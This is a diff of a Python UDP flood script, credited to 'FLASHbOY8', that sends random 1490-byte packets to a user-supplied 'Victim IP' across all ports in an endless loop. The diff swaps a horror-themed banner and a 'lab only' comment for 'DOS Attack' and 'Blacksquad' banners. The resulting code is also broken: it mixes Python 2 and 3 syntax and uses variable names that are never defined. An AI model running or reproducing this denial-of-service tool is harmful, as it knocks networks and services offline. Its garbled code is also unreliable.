@@ -1,13 +1,25 @@
-mport sys
+import sys
 import os
 import time
 import socket
 import random
+#Code Time
 from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-# Clear screen and show horror-themed banner
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
 os.system("clear")
-os.system("figlet 'HACKER'S NIGHT'")
+os.system("figlet DOS Attack ")
+
 print("\n")
 print("  🔥 A project by: FLASHbOY8")
 print("  📎 GitHub      : https://github.com/FLASHbOY8\n")
@@ -16,37 +28,30 @@ print("  The lights flicker... a chill runs down the cable spine.")
 print("  You've opened the gateway to the nether-net.")
 print("  Beware... for what you unleash may echo through firewalls eternal.\n")
 
-# Log current timestamp
-now = datetime.now()
-print(f"[{now.strftime('%Y-%m-%d %H:%M:%S')}] 🕯️ Ritual initiated...\n")
-
-# UDP socket setup
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-payload = random._urandom(1490)
-
 # Target info
 target_ip = input("💀 Enter Victim IP        : ")
 target_port = int(input("💣 Enter Starting Port    : "))
 
-print("\nSummoning malicious packets...\n")
-progress = [
-    "[                    ] 0%",
-    "[======>            ] 30%",
-    "[============>      ] 60%",
-    "[=================> ] 90%",
-    "[===================] 100%"
-]
-
-for stage in progress:
-    print(stage)
-    time.sleep(1.2)
-
-# Begin the mock attack (lab only!)
+os.system("clear")
+os.system("figlet 'Blacksquad'")
+os.system("figlet 'Attack Starting'")
+os.system("echo '       ]===> I am the Boss now <===['")
+print " \n"
+print "[                     ] 0% "
+time.sleep(5)
+print "[=====>               ] 25%"
+time.sleep(5)
+print "[==========>          ] 50%"
+time.sleep(5)
+print "[===============>     ] 75%"
+time.sleep(5)
+print "[====================>] 100%"
+time.sleep(3)
 sent = 0
 while True:
-    sock.sendto(payload, (target_ip, target_port))
-    sent += 1
-    target_port += 1
-    print(f"👻 [{sent}] Packet sent to {target_ip} on port {target_port}")
-    if target_port > 65534:
-        target_port = 1
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1 
